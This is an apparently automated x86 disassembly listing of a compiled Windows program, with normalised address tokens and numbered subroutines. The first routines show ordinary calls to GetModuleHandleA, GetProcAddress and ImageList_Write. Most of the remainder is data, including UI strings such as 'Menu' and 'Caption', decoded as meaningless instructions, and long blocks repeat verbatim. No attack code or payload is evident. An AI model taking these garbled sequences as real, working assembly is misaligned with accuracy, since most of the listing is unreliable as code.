mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41b018
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_45b130
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_45b3c4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45b618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421a54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b712
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c220
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_45a1b4
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_45a1b4
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b719
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
jmp r-xdata
sub_45b780
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
mov edx esi
call sub_45aef0
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_45b7cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b7f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b7f8
retn
sub_45bb0e
inc ebp
add [ eax ] ah
sbb [ edx ] al
pop eax
rol [ ebp ] 0x1
jo r-xdata
into
inc ebp
add ah dl
int 0x45
add [ edx + edx * 4 - 0x31fbffbb ] al
inc ebp
add [ esi + ecx * 8 + 0x45 ] dh
add [ eax - 0x23ffba32 ] ch
into
inc ebp
add [ eax ] bh
iretd
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
inc edx
add [ ecx * 8 - 0x328bffbb ] bh
inc ebp
add [ ebp + ecx * 8 - 0x31c7ffbb ] ah
sub_45bb4e
inc ebp
add [ eax - 0x31 ] bl
inc ebp
add [ eax - 0x31 ] bh
inc ebp
add [ eax - 0x7ffba31 ] bl
xchg edx eax
inc ebp
add [ eax + 0x45cf ] bh
xchg ebx eax
inc ebp
add [ ebx + edx * 4 ] al
inc ebp
add ah dl
iretd
sub_45bb72
inc ebp
add [ eax ] bl
rol [ ebp ] 0x1
cmp al dl
inc ebp
add [ ecx * 8 + 0x540f0045 ] dl
dec ebp
outsb
jne r-xdata
add al 0x35
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] al
rol [ ebp ] 0x1
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xbc
inc ebp
add [ eax - 0x44 ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
mov esp 0xbc6a0045
inc ebp
add [ eax + eax + 0x6f840000 ] ch
inc ecx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
sub_45be4e
in al dx
clc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
cmp eax 0xfcff0000
test [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x9c6d6574
outsd
dec ecx
je r-xdata
js r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
pop edx
inc ecx
add [ eax ] ah
add bh bh
int1
inc ebp
add [ ecx + edi * 8 ] ch
insd
pushfd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
sub al 0xf9
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
int3
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add ah cl
push ss
inc edx
add ah bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ esi - 0x40 ] cl
inc ebp
add [ edx - 0x40 ] ah
inc ebp
add [ eax ] bl
add [ eax ] al
test [ edi + 0x41 ] ch
je r-xdata
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ebx + eax + 0xc480046 ] bl
inc esi
add [ esp + eax + 0xc780046 ] cl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
mov eax 0xb0004213
jb r-xdata
cmp al 0xc0
insd
pushad
mov ecx 0x980045
add bh bh
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] bh
add al 0x46
add [ eax ] cl
nop
inc ecx
add al al
adc al [ edx ]
and al 0x8f
inc ecx
add [ eax + 0xc ] ah
inc esi
add ah bh
or al 0x46
xor eax 0x34f80040
jae r-xdata
insd
fdivr [ ecx + 0xa00045 ]
add bh bh
mov al [ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
inc esi
dec ecx
je r-xdata
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
mov al [ 0xffffffffe4004214 ]
inc ebp
add [ eax + eax * 8 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
add al al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 8 ] bh
sub_45befd
inc ebp
add [ ecx + edi * 8 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xb4656c62
pop edx
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
[ ecx + edi * 8 + 0x45 ]
sub_45c0ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rol [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
rol [ ebp ] 0x60
add [ eax ] al
add [ edi + edi * 4 + 0x16cc0045 ] dh
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] bh
add al 0x46
add [ eax ] cl
nop
inc ecx
add al al
adc al [ edx ]
and al 0x8f
inc ecx
add [ eax + 0xc ] ah
inc esi
add ah bh
or al 0x46
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ebx + eax + 0xc480046 ] bl
inc esi
add [ eax ] bh
adc al [ esi ]
jl r-xdata
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xf4756e65
rol [ ebp ] 0x68
rol [ ebp ] 0xb
add [ 0x756e654d ] al
jae r-xdata
inc esi
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rol [ eax - 0x3f ] 0x45
add [ ecx + edx ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x1c0045ba ] dl
adc [ esi ] eax
sub al 0x11
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb065646f
popfd
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
inc [ ebx + ecx + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
mov edx es
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
inc ebp
add [ eax ] cl
add bh bh
ror [ esi + eax * 2 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
mov al 0x9d
nop
mov edx 0x113c0045
inc esi
add [ ecx + edx + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
or al 0xc3
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsb
je r-xdata
ja r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ ecx + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045c2 ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov dl al
inc ebp
add [ esi ] al
adc [ eax ] al
inc ecx
add [ eax ] al
inc eax
add [ ecx ] al
add bh bh
dec ebp
jb r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax + 0x8004618 ] dl
nop
inc ecx
add al al
adc al [ edx ]
and al 0x8f
inc ecx
add [ eax + 0xc ] ah
inc esi
add ah bh
or al 0x46
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + ebx ] bl
inc esi
add [ eax + 0xc ] cl
inc esi
add [ esp + eax + 0xc780046 ] cl
inc esi
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
retn 0x45
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
popad
insb
pop ecx
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ eax + edx + 0x99c0046 ]
jo r-xdata
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
retn
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
inc eax
add al bh
xor al 0x40
je r-xdata
outsd
insd
or [ eax + 0x61 ] dh
jo r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ ecx + edx ] bh
jo r-xdata
outsd
outsb
add eax 0x756e654d
jae r-xdata
je r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
or bl al
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
dec eax
outsd
je r-xdata
add ah al
sbb [ esi ] al
jl r-xdata
or al 0x46
retn
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx ] bl
inc esi
add [ ecx + edx ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
retn
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
push 0x616d0d74
inc ebp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ eax + 0x32 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 ] bl
inc ebp
add [ eax ] bh
add [ eax ] al
mov ah 0xbf
inc ebp
add ah cl
push ss
inc edx
add ah bh
outsd
inc edx
outsd
je r-xdata
int3
dec ebp
outsb
jne r-xdata
je r-xdata
jo r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
outsb
jne r-xdata
outsd
outsb
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
int3
sub al 0xc4
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] ecx
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
pop edx
inc ecx
add al bl
sbb [ esi ] al
loopne r-xdata
dec eax
inc esi
add [ ecx + edx + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
nop
mov edx 0x113c0045
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
test [ ebx ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
mov al 0x9d
inc ebp
add [ eax ] cl
add bh bh
ror [ esi + eax * 2 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x79 ] bl
inc ecx
add ah bh
mov [ ecx ] al
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
pop ecx
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ eax + edx + 0x99c0046 ]
dec ebp
outsd
enter 0x45c2 0x0
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jo r-xdata
inc ebx
push 0x65676e61
mov ah 0x5a
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
retn 0x45
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
pop edx
inc ecx
add [ edi + eax * 4 - 0x77d7ffbf ] ch
inc ecx
add [ edx + edx + 0x540a0046 ] dl
push eax
outsd
jo r-xdata
add [ eax ] bh
pushad
outsb
pushfd
mov eax 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
je r-xdata
sar [ esi + eax * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov [ ebp ] 0x14
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov al [ 0x40042c3 ]
les eax [ edx ]
in al 0xc3
inc edx
add al dl
retn
imul esi [ ebx + 0x74 ] 0x45c6e890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov [ ebp ] 0x8
add [ eax ] al
add [ eax ] bl
rol [ edx ] 0xf0
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x40042c3 ] ah
sub_45c243
mov eax 0x1004610
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
je r-xdata
outsb
je r-xdata
or bl al
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60045c2 ] cl
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
mov eax 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
mov edx es
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
retn
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
int3
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
or al 0xc3
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
or eax 0x6f42616d
insd
popad
push esp
outsd
jo r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x8004618 ] dl
nop
inc ecx
add al al
adc al [ edx ]
and al 0x8f
inc ecx
add [ eax + 0xc ] ah
inc esi
add ah bh
or al 0x46
add [ eax - 0x5fffbded ] ch
adc al 0x42
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + ebx ] bl
inc esi
add [ eax + 0xc ] cl
inc esi
add [ esp + eax + 0xc780046 ] cl
inc esi
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 ] bl
inc ebp
add [ eax ] bh
add [ eax ] al
mov ah 0xbf
inc ebp
add ah cl
push ss
inc edx
add ah bh
outsd
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
retn 0x45
jo r-xdata
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add [ eax + 0x32 ] al
inc eax
inc eax
add al bh
xor al 0x40
outsd
insd
add [ eax ] al
outsb
jne r-xdata
add [ ecx + edx ] bh
jo r-xdata
outsd
outsb
add eax 0x756e654d
jae r-xdata
je r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4865646f
dec eax
outsd
je r-xdata
add ah al
sbb [ esi ] al
jl r-xdata
or al 0x46
retn
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx + edx ] bl
inc esi
add [ ecx + edx ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
retn
push 0x616d0d74
inc ebp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
jo r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
outsb
jne r-xdata
outsd
outsb
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
int3
sub al 0xc4
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] ecx
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
pop edx
inc ecx
add al bl
sbb [ esi ] al
loopne r-xdata
dec eax
inc esi
add [ ecx + edx + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
nop
mov edx 0x113c0045
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
test [ ebx ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
mov al 0x9d
inc ebp
add [ eax ] cl
add bh bh
ror [ esi + eax * 2 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x79 ] bl
inc ecx
add ah bh
mov [ ecx ] al
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
pop ecx
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ eax + edx + 0x99c0046 ]
dec ebp
outsd
enter 0x45c2 0x0
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jo r-xdata
inc ebx
push 0x65676e61
mov ah 0x5a
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
retn 0x45
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
pop edx
inc ecx
add [ edi + eax * 4 - 0x77d7ffbf ] ch
inc ecx
add [ edx + edx + 0x540a0046 ] dl
push eax
outsd
jo r-xdata
add [ eax ] bh
pushad
outsb
pushfd
mov eax 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
je r-xdata
sar [ esi + eax * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov [ ebp ] 0x14
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov al [ 0x40042c3 ]
les eax [ edx ]
in al 0xc3
inc edx
add al dl
retn
imul esi [ ebx + 0x74 ] 0x45c6e890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov [ ebp ] 0x8
add [ eax ] al
add [ eax ] bl
